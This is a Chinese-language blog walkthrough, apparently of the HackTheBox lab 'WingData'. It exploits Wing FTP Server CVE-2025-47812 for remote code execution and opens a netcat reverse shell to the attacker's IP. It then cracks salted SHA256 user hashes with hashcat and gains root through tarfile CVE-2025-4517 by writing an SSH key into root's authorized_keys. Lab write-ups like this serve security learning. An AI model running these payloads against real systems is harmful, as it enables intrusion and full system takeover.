@@ -1,0 +1,371 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="Nmap12345678┌──(kali👻Thr2on1)-[~&#x2F;Websec&#x2F;HTB&#x2F;WingData]└─$ sudo nmap -p- --min-rate 5000 -oA nmapscans&#x2F;ports 10.129.239.109Nmap scan report for 10.129.239.109Host is up (0.099s latency).Not shown: 6553">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HTB-WingData">
+<meta property="og:url" content="https://thr2on1.github.io/2026/02/16/HTB-WingData/index.html">
+<meta property="og:site_name" content="Thr2on1&#39;s Blog">
+<meta property="og:description" content="Nmap12345678┌──(kali👻Thr2on1)-[~&#x2F;Websec&#x2F;HTB&#x2F;WingData]└─$ sudo nmap -p- --min-rate 5000 -oA nmapscans&#x2F;ports 10.129.239.109Nmap scan report for 10.129.239.109Host is up (0.099s latency).Not shown: 6553">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2026-02-16T02:37:50.000Z">
+<meta property="article:modified_time" content="2026-02-16T04:08:59.872Z">
+<meta property="article:author" content="Thr2on1">
+<meta property="article:tag" content="Sudo">
+<meta property="article:tag" content="Linux">
+<meta property="article:tag" content="CVE-2025-47812">
+<meta property="article:tag" content="SHA256">
+<meta property="article:tag" content="CVE-2025-4517">
+<meta name="twitter:card" content="summary">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>HTB-WingData</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Category</a></li><!--
+     --><!--
+       --><li><a href="/tags/">tags</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2026/02/14/HTB-Pterodactyl/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://thr2on1.github.io/2026/02/16/HTB-WingData/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://thr2on1.github.io/2026/02/16/HTB-WingData/&text=HTB-WingData"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://thr2on1.github.io/2026/02/16/HTB-WingData/&title=HTB-WingData"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://thr2on1.github.io/2026/02/16/HTB-WingData/&is_video=false&description=HTB-WingData"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=HTB-WingData&body=Check out this article: https://thr2on1.github.io/2026/02/16/HTB-WingData/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://thr2on1.github.io/2026/02/16/HTB-WingData/&title=HTB-WingData"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://thr2on1.github.io/2026/02/16/HTB-WingData/&title=HTB-WingData"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://thr2on1.github.io/2026/02/16/HTB-WingData/&title=HTB-WingData"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://thr2on1.github.io/2026/02/16/HTB-WingData/&title=HTB-WingData"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://thr2on1.github.io/2026/02/16/HTB-WingData/&name=HTB-WingData&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://thr2on1.github.io/2026/02/16/HTB-WingData/&t=HTB-WingData"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Nmap"><span class="toc-number">1.</span> <span class="toc-text">Nmap</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2025-47812"><span class="toc-number">2.</span> <span class="toc-text">CVE-2025-47812</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Foothold"><span class="toc-number">3.</span> <span class="toc-text">Foothold</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2025-4517-to-ROOT"><span class="toc-number">4.</span> <span class="toc-text">CVE-2025-4517 to ROOT</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        HTB-WingData
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">Thr2on1</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2026-02-16T02:37:50.000Z" class="dt-published" itemprop="datePublished">2026-02-16</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/HackTheBox/">HackTheBox</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/CVE-2025-4517/" rel="tag">CVE-2025-4517</a>, <a class="p-category" href="/tags/CVE-2025-47812/" rel="tag">CVE-2025-47812</a>, <a class="p-category" href="/tags/Linux/" rel="tag">Linux</a>, <a class="p-category" href="/tags/SHA256/" rel="tag">SHA256</a>, <a class="p-category" href="/tags/Sudo/" rel="tag">Sudo</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h2 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali👻Thr2on1)-[~/Websec/HTB/WingData]</span><br><span class="line">└─$ <span class="built_in">sudo</span> nmap -p- --min-rate 5000 -oA nmapscans/ports 10.129.239.109</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.129.239.109</span><br><span class="line">Host is up (0.099s latency).</span><br><span class="line">Not shown: 65533 filtered tcp ports (no-response)</span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line">22/tcp open  ssh</span><br><span class="line">80/tcp open  http</span><br></pre></td></tr></table></figure>
+
+<p>只有两个端口</p>
+<h2 id="CVE-2025-47812"><a href="#CVE-2025-47812" class="headerlink" title="CVE-2025-47812"></a>CVE-2025-47812</h2><p>查看web应用，在首页可以跳转到<code>ftp.wingdata.htb</code>，发现是Wing FTP Server，版本为<code>v7.4.3</code>。Google搜索相关漏洞，该服务器存在CVE-2025-47812（漏洞版本：version&lt;7.4.4）未授权RCE。可以在github上搜索相关的exp利用（<a target="_blank" rel="noopener" href="https://github.com/4m3rr0r/CVE-2025-47812-poc%EF%BC%89">https://github.com/4m3rr0r/CVE-2025-47812-poc）</a></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali👻Thr2on1)-[~/Websec/HTB/WingData/CVE-2025-47812-poc]</span><br><span class="line">└─$ python3 CVE-2025-47812.py -u http://ftp.wingdata.htb/ -c <span class="string">&quot;id&quot;</span>         </span><br><span class="line"></span><br><span class="line">[*] Testing target: http://ftp.wingdata.htb/</span><br><span class="line">[+] Sending POST request to http://ftp.wingdata.htb//loginok.html with <span class="built_in">command</span>: <span class="string">&#x27;id&#x27;</span> and username: <span class="string">&#x27;anonymous&#x27;</span></span><br><span class="line">[+] UID extracted: c9495b9aea10e5a08fb75c2d5de4aabbf528764d624db129b32c21fbca0cb8d6</span><br><span class="line">[+] Sending GET request to http://ftp.wingdata.htb//dir.html with UID: c9495b9aea10e5a08fb75c2d5de4aabbf528764d624db129b32c21fbca0cb8d6</span><br><span class="line"></span><br><span class="line">--- Command Output ---                                                                                                                                                                          </span><br><span class="line">uid=1000(wingftp) gid=1000(wingftp) <span class="built_in">groups</span>=1000(wingftp),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),100(<span class="built_in">users</span>),106(netdev)</span><br><span class="line">----------------------</span><br></pre></td></tr></table></figure>
+
+<p>可以看到成功执行了<code>id</code>命令，构造payload进行反弹shell</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc 10.10.16.9 4444 -e /bin/sh</span><br></pre></td></tr></table></figure>
+
+<p>靶机上有python环境，可以提升一下shell的交互性</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -c <span class="string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="Foothold"><a href="#Foothold" class="headerlink" title="Foothold"></a>Foothold</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">listening on [any] 4444 ...</span><br><span class="line">connect to [10.10.16.9] from (UNKNOWN) [10.129.96.80] 57328</span><br><span class="line">python3 -c <span class="string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br><span class="line">wingftp@wingdata:/opt/wftpserver$ <span class="built_in">id</span></span><br><span class="line"><span class="built_in">id</span></span><br><span class="line">uid=1000(wingftp) gid=1000(wingftp) <span class="built_in">groups</span>=1000(wingftp),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),100(<span class="built_in">users</span>),106(netdev)</span><br></pre></td></tr></table></figure>
+
+<p>弹到的shell是wingftp用户，查看<code>/etc/passwd</code>可以发现存在wacky用户。先在靶机上收集信息，</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">wingftp@wingdata:/opt/wftpserver/Data/1/users$ <span class="built_in">ls</span> -al</span><br><span class="line"><span class="built_in">ls</span> -al</span><br><span class="line">total 28</span><br><span class="line">drwxr-x--- 2 wingftp wingftp 4096 Feb 15 22:00 .</span><br><span class="line">drwxr-x--- 4 wingftp wingftp 4096 Feb  9 08:19 ..</span><br><span class="line">-rwxr-x--- 1 wingftp wingftp 2842 Feb 15 22:00 anonymous.xml</span><br><span class="line">-rwxr-x--- 1 wingftp wingftp 2846 Nov  2 11:13 john.xml</span><br><span class="line">-rw-rw-rw- 1 wingftp wingftp 2847 Nov  2 12:05 maria.xml</span><br><span class="line">-rw-rw-rw- 1 wingftp wingftp 2847 Nov  2 12:02 steve.xml</span><br><span class="line">-rw-rw-rw- 1 wingftp wingftp 2856 Nov  2 12:28 wacky.xml</span><br></pre></td></tr></table></figure>
+
+<p>在<code>Data/1/users</code>目录下有很多用户的配置文件，其中有用户的hash，全都保存下来准备爆破密码。查看wftpserver的官方文档，从中得知密码加密方式，且在进行sha256的时候可能存在盐值。</p>
+<p>在<code>Data/1</code>目录下的<code>settings.xml</code>文件中可以找到盐值相关的配置。</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">EnablePasswordSalting</span>&gt;</span>1<span class="tag">&lt;/<span class="name">EnablePasswordSalting</span>&gt;</span>                                                         </span><br><span class="line"><span class="tag">&lt;<span class="name">SaltingString</span>&gt;</span>WingFTP<span class="tag">&lt;/<span class="name">SaltingString</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>使用hashcat进行爆破</p>
+<p>pass.hash</p>
+<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca:WingFTP</span><br><span class="line">5916c7481fa2f20bd86f4bdb900f0342359ec19a77b7e3ae118f3b5d0d3334ca:WingFTP</span><br><span class="line">a70221f33a51dca76dfd46c17ab17116a97823caf40aeecfbc611cae47421b03:WingFTP</span><br><span class="line">c1f14672feec3bba27231048271fcdcddeb9d75ef79f6889139aa78c9d398f10:WingFTP</span><br><span class="line">d67f86152e5c4df1b0ac4a18d3ca4a89c1b12e6b748ed71d01aeb92341927bca:WingFTP</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali👻Thr2on1)-[~/Websec/HTB/WingData/CVE-2025-47812-poc]</span><br><span class="line">└─$ hashcat -m 1410 -a 0 pass.hash /usr/share/wordlists/rockyou.txt                </span><br><span class="line">32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca:WingFTP:!#7Blushing^*Bride5</span><br></pre></td></tr></table></figure>
+
+<p>拿到密码可以通过ssh登陆到wacky用户</p>
+<h2 id="CVE-2025-4517-to-ROOT"><a href="#CVE-2025-4517-to-ROOT" class="headerlink" title="CVE-2025-4517 to ROOT"></a>CVE-2025-4517 to ROOT</h2><p><code>sudo -l</code>查看用户可用的sudo命令</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">wacky@wingdata:~$ <span class="built_in">sudo</span> -l</span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> wacky on wingdata:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty</span><br><span class="line"></span><br><span class="line">User wacky may run the following commands on wingdata:</span><br><span class="line">    (root) NOPASSWD: /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py *</span><br></pre></td></tr></table></figure>
+
+<p>发现wacky可以运行<code>/opt/backup_clients/restore_backup_clients.py</code>python脚本，下载python脚本进行审计。python脚本的功能是将<code>/opt/backup_clients/backups</code>目录下的tar包解压到<code>/opt/backup_clients/restored_backups</code>目录下。</p>
+<p><strong>漏洞代码：</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">with</span> tarfile.<span class="built_in">open</span>(backup_path, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> tar:</span><br><span class="line">            tar.extractall(path=staging_dir, <span class="built_in">filter</span>=<span class="string">&quot;data&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[+] Extraction completed in <span class="subst">&#123;staging_dir&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span> (tarfile.TarError, OSError, Exception) <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[!] Error during extraction: <span class="subst">&#123;e&#125;</span>&quot;</span>, file=sys.stderr)</span><br><span class="line">        sys.exit(<span class="number">2</span>)</span><br></pre></td></tr></table></figure>
+
+<p>这里存在CVE-2025-4517漏洞，即<code>tarfile.extractall()或tarFile.extract()</code>在配置<code>filter=data或filter=tar</code>时，可以利用RealPath溢出绕过filter的限制将tar解压到其他文件中。因此我们可以将自己的公钥写入到<code>/root/.ssh/authorized_keys</code>中，然后通过ssh登陆到root用户。在github上搜索exp生成恶意的tar包（<a target="_blank" rel="noopener" href="https://github.com/DesertDemons/CVE-2025-4138-4517-POC%EF%BC%89">https://github.com/DesertDemons/CVE-2025-4138-4517-POC）</a></p>
+<p><strong>0x01 生成ssh密钥对</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t ed25519 -f id_ed25519 -N <span class="string">&quot;&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>会生成<code>id_ed25519.pub</code>和<code>id_ed25519</code>公钥和私钥文件</p>
+<p><strong>0x02 生成tar包</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 exploit.py --tar-out backup_1002.tar --target /root/.ssh/authorized_keys --payload id_ed25519.pub --mode 0600</span><br></pre></td></tr></table></figure>
+
+<p><strong>0x03 上传至靶机利用</strong></p>
+<p>可以通过多种方式上传至靶机。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">wacky@wingdata:/opt/backup_clients/backups$ <span class="built_in">sudo</span> /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py -b backup_1002.tar -r restore_pwn</span><br><span class="line">[+] Backup: backup_1002.tar</span><br><span class="line">[+] Staging directory: /opt/backup_clients/restored_backups/restore_pwn</span><br><span class="line">[+] Extraction completed <span class="keyword">in</span> /opt/backup_clients/restored_backups/restore_pwn</span><br></pre></td></tr></table></figure>
+
+<p><strong>0x04 ssh登录</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ssh -i id_ed25519 root@wingdata.htb</span><br><span class="line">root@wingdata:~# <span class="built_in">id</span></span><br><span class="line">uid=0(root) gid=0(root) <span class="built_in">groups</span>=0(root)</span><br></pre></td></tr></table></figure>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a href="/categories/">Category</a></li>
+        
+          <li><a href="/tags/">tags</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Nmap"><span class="toc-number">1.</span> <span class="toc-text">Nmap</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2025-47812"><span class="toc-number">2.</span> <span class="toc-text">CVE-2025-47812</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Foothold"><span class="toc-number">3.</span> <span class="toc-text">Foothold</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2025-4517-to-ROOT"><span class="toc-number">4.</span> <span class="toc-text">CVE-2025-4517 to ROOT</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://thr2on1.github.io/2026/02/16/HTB-WingData/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://thr2on1.github.io/2026/02/16/HTB-WingData/&text=HTB-WingData"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://thr2on1.github.io/2026/02/16/HTB-WingData/&title=HTB-WingData"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://thr2on1.github.io/2026/02/16/HTB-WingData/&is_video=false&description=HTB-WingData"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=HTB-WingData&body=Check out this article: https://thr2on1.github.io/2026/02/16/HTB-WingData/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://thr2on1.github.io/2026/02/16/HTB-WingData/&title=HTB-WingData"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://thr2on1.github.io/2026/02/16/HTB-WingData/&title=HTB-WingData"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://thr2on1.github.io/2026/02/16/HTB-WingData/&title=HTB-WingData"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://thr2on1.github.io/2026/02/16/HTB-WingData/&title=HTB-WingData"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://thr2on1.github.io/2026/02/16/HTB-WingData/&name=HTB-WingData&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://thr2on1.github.io/2026/02/16/HTB-WingData/&t=HTB-WingData"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2025-2026
+    Thr2on1
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Category</a></li><!--
+     --><!--
+       --><li><a href="/tags/">tags</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
